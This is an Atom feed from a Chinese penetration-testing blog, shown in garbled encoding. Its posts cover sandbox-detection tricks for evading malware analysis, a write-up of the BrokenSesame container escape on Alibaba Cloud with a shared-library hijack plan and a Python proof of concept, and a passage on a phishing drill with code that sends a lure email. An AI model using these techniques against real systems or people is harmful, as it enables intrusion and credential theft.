<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ğŸ˜Š#</title>
  
  
  <link href="https://jkme.github.io/atom.xml" rel="self"/>
  
  <link href="https://jkme.github.io/"/>
  <updated>2023-04-23T08:17:06.021Z</updated>
  <id>https://jkme.github.io/</id>
  
  <author>
    <name>JKme</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>æ²™ç›’ç¯å¢ƒä¿¡æ¯æ”¶é›†</title>
    <link href="https://jkme.github.io/2023/04/23/sandbox-info-collect.html"/>
    <id>https://jkme.github.io/2023/04/23/sandbox-info-collect.html</id>
    <published>2023-04-22T16:00:00.000Z</published>
    <updated>2023-04-23T08:17:06.021Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç›®çš„"><a href="#ç›®çš„" class="headerlink" title="ç›®çš„"></a>ç›®çš„</h2><p>æ”¶é›†æ²™ç›’çš„ç¯å¢ƒ</p><h2 id="çœ‹å›¾è¯´è¯"><a href="#çœ‹å›¾è¯´è¯" class="headerlink" title="çœ‹å›¾è¯´è¯"></a>çœ‹å›¾è¯´è¯</h2><p><img src="/2023/04/23/sandbox-info-collect/1.png"></p><p>ä»ä¸Šé¢çš„å›¾å°±èƒ½çœ‹å‡ºæ¥å¾ˆå¤šç‰¹å¾:</p><ul><li>æ¯”å¦‚ä¸­å›½çš„æ—¶åŒºæ˜¯-8ï¼Œæ²™ç›’å¤šä¸æ˜¯ï¼Œå½“ç„¶æŸæ­¥é™¤å¤–</li><li>ç¬¬ä¸‰æ¡æ˜¯æŸæ­¥çš„æ²™ç›’ï¼Œè¿›ç¨‹é‡Œé¢å­˜åœ¨<code>AcrylicService.exe</code>ï¼Œå®é™…ä½¿ç”¨çš„æ—¶å€™å¯ä»¥åšä¸€æ¬¡forå¾ªç¯hashåˆ¤æ–­ï¼Œé¿å…ç¨‹åºä¸­ç›´æ¥å‡ºç°å…³é”®è¯</li><li>å¤§éƒ¨åˆ†æ²™ç›’ä¼šé‡æ–°äºŒæ¬¡ä¿®æ”¹ä¸ºéšæœºæ–‡ä»¶åï¼Œä¹Ÿå¯ä»¥ä»è¿™ä¸ªç‚¹ä¸‹æ‰‹</li><li>å†…å­˜ä¸€èˆ¬å°äº4G</li><li>éƒ¨åˆ†è™šæ‹Ÿæœºå­˜åœ¨Cucooçš„ç‰¹å¾ï¼Œæ¯”å¦‚æŸæ­¥ï¼Œå…·ä½“å¯ä»¥çœ‹<a href="https://github.com/CheckPointSW/InviZzzible">CheckPointSW/InviZzzible</a></li><li>ä¹Ÿå¯ä»¥ç”¨ä¸»æœºåä½œä¸ºåˆ¤æ–­æ¡ä»¶</li></ul><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://mp.weixin.qq.com/s/CY9RnIAn-la573BWrkufNQ">æ²™ç®±ç¯å¢ƒæ£€æµ‹å’Œç»•è¿‡</a></li><li><a href="https://github.com/CheckPointSW/InviZzzible">CheckPointSW/InviZzzible</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ç›®çš„&quot;&gt;&lt;a href=&quot;#ç›®çš„&quot; class=&quot;headerlink&quot; title=&quot;ç›®çš„&quot;&gt;&lt;/a&gt;ç›®çš„&lt;/h2&gt;&lt;p&gt;æ”¶é›†æ²™ç›’çš„ç¯å¢ƒ&lt;/p&gt;
&lt;h2 id=&quot;çœ‹å›¾è¯´è¯&quot;&gt;&lt;a href=&quot;#çœ‹å›¾è¯´è¯&quot; class=&quot;headerlink&quot; title=&quot;çœ‹å›¾è¯´è¯&quot;&gt;&lt;/a&gt;çœ‹å›¾è¯´è¯&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2023/04/23/sandbox-info-collect/1.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;ä»ä¸Šé¢çš„å›¾å°±èƒ½çœ‹å‡ºæ¥å¾ˆå¤šç‰¹å¾:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ¯”å¦‚ä¸­å›½çš„æ—¶åŒºæ˜¯-8ï¼Œæ²™ç›’å¤šä¸æ˜¯ï¼Œå½“ç„¶æŸæ­¥é™¤å¤–&lt;/li&gt;
&lt;li&gt;ç¬¬ä¸‰æ¡æ˜¯æŸæ­¥çš„æ²™ç›’ï¼Œè¿›ç¨‹é‡Œé¢å­˜åœ¨&lt;code&gt;AcrylicService.exe&lt;/code&gt;ï¼Œå®é™…ä½¿ç”¨çš„æ—¶å€™å¯ä»¥åšä¸€æ¬¡forå¾ªç¯hashåˆ¤æ–­ï¼Œé¿å…ç¨‹åºä¸­ç›´æ¥å‡ºç°å…³é”®è¯&lt;/li&gt;
&lt;li&gt;å¤§éƒ¨åˆ†æ²™ç›’ä¼šé‡æ–°äºŒæ¬¡ä¿®æ”¹ä¸ºéšæœºæ–‡ä»¶åï¼Œä¹Ÿå¯ä»¥ä»è¿™ä¸ªç‚¹ä¸‹æ‰‹&lt;/li&gt;
&lt;li&gt;å†…å­˜ä¸€èˆ¬å°äº4G&lt;/li&gt;
&lt;li&gt;éƒ¨åˆ†è™šæ‹Ÿæœºå­˜åœ¨Cucooçš„ç‰¹å¾ï¼Œæ¯”å¦‚æŸæ­¥ï¼Œå…·ä½“å¯ä»¥çœ‹&lt;a href=&quot;https://github.com/CheckPointSW/InviZzzible&quot;&gt;CheckPointSW/InviZzzible&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;ä¹Ÿå¯ä»¥ç”¨ä¸»æœºåä½œä¸ºåˆ¤æ–­æ¡ä»¶&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;å‚è€ƒé“¾æ¥&quot;&gt;&lt;a href=&quot;#å‚è€ƒé“¾æ¥&quot; class=&quot;headerlink&quot; title=&quot;å‚è€ƒé“¾æ¥&quot;&gt;&lt;/a&gt;å‚è€ƒé“¾æ¥&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/CY9RnIAn-la573BWrkufNQ&quot;&gt;æ²™ç®±ç¯å¢ƒæ£€æµ‹å’Œç»•è¿‡&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/CheckPointSW/InviZzzible&quot;&gt;CheckPointSW/InviZzzible&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>BrokenSesame-é˜¿é‡Œäº‘æ•°æ®åº“è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</title>
    <link href="https://jkme.github.io/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE.html"/>
    <id>https://jkme.github.io/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE.html</id>
    <published>2023-04-19T16:00:00.000Z</published>
    <updated>2023-04-20T05:36:15.384Z</updated>
    
    <content type="html"><![CDATA[<ul><li>åŸæ–‡ï¼š<a href="https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r">brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r</a></li></ul><h2 id="AnalyticDB-for-PostgreSQL"><a href="#AnalyticDB-for-PostgreSQL" class="headerlink" title="AnalyticDB for PostgreSQL"></a>AnalyticDB for PostgreSQL</h2><h3 id="å®¹å™¨ææƒ"><a href="#å®¹å™¨ææƒ" class="headerlink" title="å®¹å™¨ææƒ"></a>å®¹å™¨ææƒ</h3><p>é¦–å…ˆå‘ç°äº†ä¸€ä¸ªROOTå®šæ—¶ä»»åŠ¡ï¼Œè¯¥å®šæ—¶ä»»åŠ¡æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡äºŒè¿›åˆ¶æ–‡ä»¶<code>/usr/bin/tsar</code>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$: <span class="token function">ls</span> -lah /etc/cron.d/tsar -rw-r--r-- <span class="token number">1</span> root root <span class="token number">99</span> Apr <span class="token number">19</span> â€¯<span class="token number">2021</span> /etc/cron.d/tsar $: <span class="token function">cat</span> /etc/cron.d/tsar <span class="token comment"># cron tsar collect once per minute </span><span class="token assign-left variable">MAILTO</span><span class="token operator">=</span><span class="token string">""</span> * * * * * root /usr/bin/tsar --cron <span class="token operator">></span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨<code>ldd</code>å‘ç°ä»è‡ªå®šä¹‰è·¯å¾„åŠ è½½å…±äº«åº“ï¼Œå…¶ä¸­çš„ä¸€ä¸ªè·¯å¾„<code>/u01</code>å¯¹äºå½“å‰ç”¨æˆ·<code>adbpgadmin</code>æ˜¯å¯å†™çš„ã€‚<br><img src="/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE/1.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$: <span class="token function">ls</span> -alh /u01/adbpg/lib/libgcc_s.so.1 -rwxr-xr-x <span class="token number">1</span> adbpgadmin adbpgadmin 102K Oct <span class="token number">27</span> <span class="token number">12</span>:22 /u01/adbpg/lib/libgcc_s.so.1 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¦‚æœç”¨è‡ªå·±çš„å…±äº«åº“è¦†ç›–è¿™ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆä¸‹æ¬¡å°±ä¼šä»¥rootæƒé™æ‰§è¡Œè‡ªå®šä¹‰çš„ä»£ç ï¼Œæ”»å‡»æµç¨‹ï¼š</p><ul><li>ç¼–è¯‘ä¸€ä¸ªå…±äº«åº“ï¼ŒåŠŸèƒ½æ˜¯å°†<code>/bin/bash</code>å¤åˆ¶åˆ°<code>/bin/dash</code>ï¼Œå¹¶æ·»åŠ SUIDæƒé™ã€‚</li><li>æŠŠç¼–è¯‘å¥½çš„å…±äº«åº“ä½¿ç”¨<a href="https://github.com/NixOS/patchelf">PatchELF</a>ï¼Œæ·»åŠ åˆ°<code>libgcc_s.so.1</code>ï¼Œè¿™æ ·å½“<code>libgcc_s.so.1</code>è¢«åŠ è½½çš„æ—¶å€™ï¼Œæ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œã€‚</li><li>è¦†ç›–<code>libgcc_s.so.1</code>åº“</li><li>ç­‰å¾…å®šæ—¶ä»»åŠ¡æ‰§è¡Œ</li></ul><p>æœ€ç»ˆè·å–Rootæƒé™:<br><img src="/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE/2.png"></p><h3 id="é€ƒé€¸åˆ°K8s-Node"><a href="#é€ƒé€¸åˆ°K8s-Node" class="headerlink" title="é€ƒé€¸åˆ°K8s Node"></a>é€ƒé€¸åˆ°K8s Node</h3><p>æ ¹æ®ä½œè€…å¯¹äº‘æœåŠ¡çš„æµ‹è¯•ç»éªŒï¼Œä¸€èˆ¬UIç•Œé¢çš„æ“ä½œä¼šå¯¼è‡´æ‰˜ç®¡ç¯å¢ƒåˆ›å»ºå®¹å™¨æˆ–è€…è¿›ç¨‹ï¼Œä»è€Œæ‰©å¤§æ”»å‡»é¢ã€‚æ¯”å¦‚åœ¨é˜¿é‡Œäº‘é—¨æˆ·ä¸­æŸäº›æ“ä½œï¼ˆå¯ç”¨SSLåŠ å¯†ï¼‰ï¼Œå¯ä»¥è§‚å¯Ÿåˆ°å¤šä¸ªSCPå’ŒSSHè¿›ç¨‹çš„åˆ›å»ºã€‚<br><img src="/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE/3.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Command lines of the spawned processes</span><span class="token function">su</span> - adbpgadmin -c <span class="token function">scp</span> /home/adbpgadmin/xxx_ssl_files/* *REDACTED*:/home/adbpgadmin/data/master/seg-1/ /usr/bin/ssh -x -oForwardAgent<span class="token operator">=</span>no -oPermitLocalCommand<span class="token operator">=</span>no -oClearAllForwardings<span class="token operator">=</span>yes -- *REDACTED* <span class="token function">scp</span> -d -t /home/adbpgadmin/data/master/seg-1/ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½œè€…å‘ç°è¿™äº›ç”Ÿæˆçš„è¿›ç¨‹åŒ…å«å®¹å™¨ä¸­ä¸å­˜åœ¨çš„è·¯å¾„ï¼Œæ¨æµ‹æ˜¯åœ¨å®¹å™¨å…±äº«PIDä¸­ä¸åŒå®¹å™¨ä¸­ç”Ÿæˆçš„ï¼Œä¸ºäº†éªŒè¯è€…æ¨æµ‹ï¼Œä½œè€…å†™äº†ä¸€ä¸ªPOCï¼Œå½“ç”ŸæˆSCPè¿›ç¨‹çš„æ—¶å€™ï¼Œä½¿ç”¨<code>/proc/&#123;pid&#125;/root/</code>è®¿é—®è¯¥è¿›ç¨‹ä¸‹çš„æ–‡ä»¶ç³»ç»Ÿï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># The Python script we used to access the second container filesystem</span><span class="token keyword">import</span> psutil <span class="token keyword">import</span> os listed <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span> â€¯ â€¯ <span class="token keyword">for</span> proc <span class="token keyword">in</span> psutil<span class="token punctuation">.</span>process_iter<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> â€¯ â€¯ â€¯ â€¯ <span class="token keyword">try</span><span class="token punctuation">:</span> â€¯ â€¯ â€¯ â€¯ â€¯ â€¯ processName <span class="token operator">=</span> proc<span class="token punctuation">.</span>name<span class="token punctuation">(</span><span class="token punctuation">)</span> â€¯ â€¯ â€¯ â€¯ â€¯ â€¯ processID <span class="token operator">=</span> proc<span class="token punctuation">.</span>pid â€¯ â€¯ â€¯ â€¯ â€¯ â€¯ cmdLine <span class="token operator">=</span> proc<span class="token punctuation">.</span>cmdline<span class="token punctuation">(</span><span class="token punctuation">)</span> â€¯ â€¯ â€¯ â€¯ â€¯ â€¯ <span class="token keyword">if</span> processID <span class="token keyword">not</span> <span class="token keyword">in</span> listed <span class="token keyword">and</span> processName <span class="token operator">==</span> <span class="token string">'scp'</span><span class="token punctuation">:</span> â€¯ â€¯ â€¯ â€¯ â€¯ â€¯ â€¯ â€¯ os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls -alh /proc/&#123;&#125;/root/'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>processID<span class="token punctuation">)</span><span class="token punctuation">)</span> â€¯ â€¯ â€¯ â€¯ â€¯ â€¯ â€¯ â€¯ listed<span class="token punctuation">.</span>add<span class="token punctuation">(</span>processID<span class="token punctuation">)</span> â€¯ â€¯ â€¯ â€¯ <span class="token keyword">except</span> <span class="token punctuation">(</span>psutil<span class="token punctuation">.</span>NoSuchProcess<span class="token punctuation">,</span> psutil<span class="token punctuation">.</span>AccessDenied<span class="token punctuation">,</span> psutil<span class="token punctuation">.</span>ZombieProcess<span class="token punctuation">)</span><span class="token punctuation">:</span>  â€¯ â€¯ â€¯ â€¯ <span class="token keyword">pass</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨é˜¿é‡Œäº‘å¹³å°é—¨æˆ·å¯ç”¨SSLæ“ä½œä¹‹åï¼Œè§‚å¯Ÿè„šæœ¬çš„è¾“å‡ºï¼Œå¯ä»¥ç¡®è®¤å°½ç®¡ä¸¤ä¸ªå®¹å™¨ä¸åŒï¼Œä½†å®ƒä»¬çš„ä¸»ç›®å½•(/home/adbpgadmin)æ˜¯ç›¸åŒçš„æŒ‚è½½ã€‚</p><p>åœ¨éªŒè¯äº†ä¸Šé¢æƒ³æ³•ä¹‹åï¼Œä½œè€…æŒ‘é€‰ä½¿ç”¨SSHæ¥è·å–ç¬¬äºŒä¸ªå®¹å™¨çš„æƒé™ï¼Œä¿®æ”¹æœ¬åœ°sshé…ç½®æ–‡ä»¶: <code>/home/adbpgadmin/.ssh/config</code></p><p><img src="/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE/4.png"></p><p>è¿™æ ·å½“sshå‘½ä»¤æ‰§è¡Œçš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘æ‰§è¡Œ<code>LocalCommand</code>æŒ‡å®šçš„è„šæœ¬ï¼Œæ­¤æ—¶æ˜¯ä»¥rootæƒé™åœ¨ç¬¬äºŒä¸ªå®¹å™¨æ‰§è¡Œçš„ï¼Œå¹¶åœ¨ç¬¬äºŒä¸ªå®¹å™¨å‘ç°äº†<code>docker.sock</code></p><p>ç”±äºç¬¬äºŒä¸ªå®¹å™¨æ˜¯ä¸´æ—¶ç”Ÿæˆçš„ï¼Œä½œè€…åˆ©ç”¨åˆ›å»ºäº†ä¸€ä¸ªæŒä¹…åŒ–çš„å®¹å™¨ï¼Œä½†æ˜¯å…·ä½“æŠ€æœ¯ç»†èŠ‚æ²¡æœ‰è¯´æ˜ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;åŸæ–‡ï¼š&lt;a href=&quot;https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r&quot;&gt;brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;AnalyticDB-for-PostgreSQL&quot;&gt;&lt;a href=&quot;#AnalyticDB-for-PostgreSQL&quot; class=&quot;headerlink&quot; title=&quot;AnalyticDB for PostgreSQL&quot;&gt;&lt;/a&gt;AnalyticDB for PostgreSQL&lt;/h2&gt;&lt;h3 id=&quot;å®¹å™¨ææƒ&quot;&gt;&lt;a href=&quot;#å®¹å™¨ææƒ&quot; class=&quot;headerlink&quot; title=&quot;å®¹å™¨ææƒ&quot;&gt;&lt;/a&gt;å®¹å™¨ææƒ&lt;/h3&gt;&lt;p&gt;é¦–å…ˆå‘ç°äº†ä¸€ä¸ªROOTå®šæ—¶ä»»åŠ¡ï¼Œè¯¥å®šæ—¶ä»»åŠ¡æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡äºŒè¿›åˆ¶æ–‡ä»¶&lt;code&gt;/usr/bin/tsar&lt;/code&gt;:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$: &lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt; -lah /etc/cron.d/tsar 
-rw-r--r-- &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root root &lt;span class=&quot;token number&quot;&gt;99&lt;/span&gt; Apr &lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt; â€¯&lt;span class=&quot;token number&quot;&gt;2021&lt;/span&gt; /etc/cron.d/tsar 

$: &lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; /etc/cron.d/tsar 

&lt;span class=&quot;token comment&quot;&gt;# cron tsar collect once per minute &lt;/span&gt;
&lt;span class=&quot;token assign-left variable&quot;&gt;MAILTO&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt; 
* * * * * root /usr/bin/tsar --cron &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; /dev/null &lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;2&lt;/span&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;&amp;amp;1&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä½¿ç”¨&lt;code&gt;ldd&lt;/code&gt;å‘ç°ä»è‡ªå®šä¹‰è·¯å¾„åŠ è½½å…±äº«åº“ï¼Œå…¶ä¸­çš„ä¸€ä¸ªè·¯å¾„&lt;code&gt;/u01&lt;/code&gt;å¯¹äºå½“å‰ç”¨æˆ·&lt;code&gt;adbpgadmin&lt;/code&gt;æ˜¯å¯å†™çš„ã€‚&lt;br&gt;&lt;img src=&quot;/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE/1.png&quot;&gt;&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$: &lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt; -alh /u01/adbpg/lib/libgcc_s.so.1 
-rwxr-xr-x &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; adbpgadmin adbpgadmin 102K Oct &lt;span class=&quot;token number&quot;&gt;27&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt;:22 /u01/adbpg/lib/libgcc_s.so.1 &lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦‚æœç”¨è‡ªå·±çš„å…±äº«åº“è¦†ç›–è¿™ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆä¸‹æ¬¡å°±ä¼šä»¥rootæƒé™æ‰§è¡Œè‡ªå®šä¹‰çš„ä»£ç ï¼Œæ”»å‡»æµç¨‹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç¼–è¯‘ä¸€ä¸ªå…±äº«åº“ï¼ŒåŠŸèƒ½æ˜¯å°†&lt;code&gt;/bin/bash&lt;/code&gt;å¤åˆ¶åˆ°&lt;code&gt;/bin/dash&lt;/code&gt;ï¼Œå¹¶æ·»åŠ SUIDæƒé™ã€‚&lt;/li&gt;
&lt;li&gt;æŠŠç¼–è¯‘å¥½çš„å…±äº«åº“ä½¿ç”¨&lt;a href=&quot;https://github.com/NixOS/patchelf&quot;&gt;PatchELF&lt;/a&gt;ï¼Œæ·»åŠ åˆ°&lt;code&gt;libgcc_s.so.1&lt;/code&gt;ï¼Œè¿™æ ·å½“&lt;code&gt;libgcc_s.so.1&lt;/code&gt;è¢«åŠ è½½çš„æ—¶å€™ï¼Œæ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œã€‚&lt;/li&gt;
&lt;li&gt;è¦†ç›–&lt;code&gt;libgcc_s.so.1&lt;/code&gt;åº“&lt;/li&gt;
&lt;li&gt;ç­‰å¾…å®šæ—¶ä»»åŠ¡æ‰§è¡Œ&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æœ€ç»ˆè·å–Rootæƒé™:&lt;br&gt;&lt;img src=&quot;/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE/2.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>è®°ä¸€æ¬¡é’“é±¼æ¼”ç»ƒå’ŒOS Xä¸‹çš„æ¸—é€æŠ€å·§</title>
    <link href="https://jkme.github.io/2023/03/27/pinfish-and-osx-pentest.html"/>
    <id>https://jkme.github.io/2023/03/27/pinfish-and-osx-pentest.html</id>
    <published>2023-03-26T16:00:00.000Z</published>
    <updated>2023-03-30T06:21:33.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>ä¸€å¹´ä¸€åº¦çš„é’“é±¼èŠ‚ï¼Œéœ€è¦é’ˆå¯¹å…¬å¸å‘˜å·¥åšä¸€æ¬¡é’“é±¼æ¼”ç»ƒï¼Œå‰æœŸå‡†å¤‡å·¥ä½œå¦‚ä¸‹:</p><ul><li>ç¡®å®šé’“é±¼çš„é¡µé¢ï¼šå›¾æ–¹ä¾¿é€‰äº†ä¸€ä¸ªç™»å½•å…¥å£ï¼Œç”¨Chromeæ’ä»¶SingleFileå³é”®ä¸€é”®ä¿å­˜</li><li>ç¡®å®šé’“é±¼çš„å½¢å¼ï¼šå¼•å¯¼ç”¨æˆ·è¾“å…¥å…¬å¸é‚®ç®±ï¼Œç‚¹å‡»å®Œæˆä¹‹åï¼Œå¼¹å‡ºéœ€è¦å®‰è£…æ’ä»¶ï¼Œæ ¹æ®UAå†³å®šæ˜¯ä¸‹è½½pkgè¿˜æ˜¯exeã€‚</li><li>ç¡®å®šé’“é±¼çš„æ•ˆæœï¼šä»ä¸‰ä¸ªæ•°æ®ç»´åº¦æ¥çœ‹æœ€ç»ˆæ•ˆæœ<ul><li>é’“é±¼é¡µé¢è®¿é—®æ¬¡æ•°</li><li>è¾“å…¥å…¬å¸é‚®ç®±çš„æ•°é‡ç»Ÿè®¡</li><li>æ”¶é›†è¿è¡Œäº†Exeå’ŒPkgçš„ç”¨æˆ·</li></ul></li></ul><h2 id="é’“é±¼é‚®ä»¶çš„å‘é€"><a href="#é’“é±¼é‚®ä»¶çš„å‘é€" class="headerlink" title="é’“é±¼é‚®ä»¶çš„å‘é€"></a>é’“é±¼é‚®ä»¶çš„å‘é€</h2><p>æœ‰ä¸¤ç§å½¢å¼å¯ä»¥å‘é€é’“é±¼é‚®ä»¶ï¼š</p><ol><li>ä½¿ç”¨ç›¸è¿‘åŸŸå</li><li>ä½¿ç”¨sendcloud</li></ol><h3 id="ç›¸è¿‘åŸŸåå‘é€"><a href="#ç›¸è¿‘åŸŸåå‘é€" class="headerlink" title="ç›¸è¿‘åŸŸåå‘é€"></a>ç›¸è¿‘åŸŸåå‘é€</h3><p>æ³¨å†Œç›¸è¿‘åŸŸåä¹‹åï¼Œå¯ä»¥æ ¹æ®è¿™é‡Œçš„æ­¥éª¤ç»‘å®šä½¿ç”¨zohoçš„å…è´¹ä¼ä¸šé‚®ç®±: <a href="https://zhuanlan.zhihu.com/p/341879374">2021å¹´å››æ¬¾å›½å†…å¤–å…è´¹ä¼ä¸šé‚®ç®±åŠç”³è¯·æ•™ç¨‹å›¾è§£</a></p><h3 id="ä½¿ç”¨SendCloud"><a href="#ä½¿ç”¨SendCloud" class="headerlink" title="ä½¿ç”¨SendCloud"></a>ä½¿ç”¨SendCloud</h3><p>æ³¨å†ŒSendCloudä¹‹åï¼Œç”ŸæˆAPI Keyï¼Œåˆ©ç”¨ä»¥ä¸‹ä»£ç å‘é€é’“é±¼é‚®ä»¶ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span> jsonurl<span class="token operator">=</span><span class="token string">"http://api.sendcloud.net/apiv2/mail/send"</span>body <span class="token operator">=</span> <span class="token triple-quoted-string string">"""    &lt;br>    å„ä½åŒäº‹:&lt;br>    &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;æ ¹æ®ã€Šå…³äºå»¶ç»­å®æ–½å…¨å¹´ä¸€æ¬¡æ€§å¥–é‡‘ç­‰ä¸ªäººæ‰€å¾—ç¨ä¼˜æƒ æ”¿ç­–çš„å…¬å‘Šã€‹ï¼ˆè´¢æ”¿éƒ¨ç¨åŠ¡æ€»å±€2023å¹´ç¬¬4å·å…¬å‘Šï¼‰ï¼Œå…¨å¹´ä¸€æ¬¡æ€§å¥–é‡‘å•ç‹¬è®¡ç¨ä¼˜æƒ æ”¿ç­–ï¼Œæ‰§è¡ŒæœŸé™å»¶é•¿è‡³2023å¹´4æœˆ14æ—¥ã€‚ä¸ºç¡®ä¿å¹¿å¤§èŒå·¥å……åˆ†äº«å—è¯¥é¡¹ç¨æ”¶ä¼˜æƒ 